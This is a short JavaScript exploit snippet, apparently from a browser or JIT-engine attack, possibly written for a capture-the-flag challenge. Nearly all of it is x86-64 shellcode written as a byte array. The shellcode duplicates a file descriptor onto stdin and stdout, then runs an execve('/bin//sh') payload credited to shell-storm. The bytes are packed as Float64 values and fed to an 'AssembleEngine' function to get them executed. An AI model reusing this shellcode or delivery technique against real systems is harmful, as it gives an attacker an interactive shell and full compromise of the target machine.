const FD = 0x00
;

const shellcode = [
    // dup2 the fd (idk why duping to newfd=0 vs newfd=4 works lol)
/*
mov rax, 33
mov rdi, FD
mov rsi, 0
syscall
mov rax, 33
mov rdi, FD
mov rsi, 1
syscall
*/
    0x48, 0xC7, 0xC0, 0x21, 0x00, 0x00, 0x00,
    0x48, 0xC7, 0xC7, FD, 0x00, 0x00, 0x00,
    0x48, 0xC7, 0xC6, 0x00, 0x00, 0x00, 0x00,
    0x0F, 0x05,
    0x48, 0xC7, 0xC0, 0x21, 0x00, 0x00, 0x00,
    0x48, 0xC7, 0xC7, FD, 0x00, 0x00, 0x00,
    0x48, 0xC7, 0xC6, 0x01, 0x00, 0x00, 0x00,
    0x0F, 0x05,

    // http://shell-storm.org/shellcode/files/shellcode-106.html :)
    0x48, 0x31, 0xC0, 0x99, 0xB0, 0x3B, 0x48, 0xBF, 0x2F, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x48, 0xC1, 0xEF, 0x08, 0x57, 0x48, 0x89, 0xE7, 0x57, 0x52, 0x48, 0x89, 0xE6, 0x0F, 0x05,
    0xc3 // clean exit lol
];
for (let i = shellcode.length & 3; i < 4; ++i) shellcode.push(0x90/* nop */);

AssembleEngine([...new Float64Array(new Uint8Array(shellcode).buffer)]);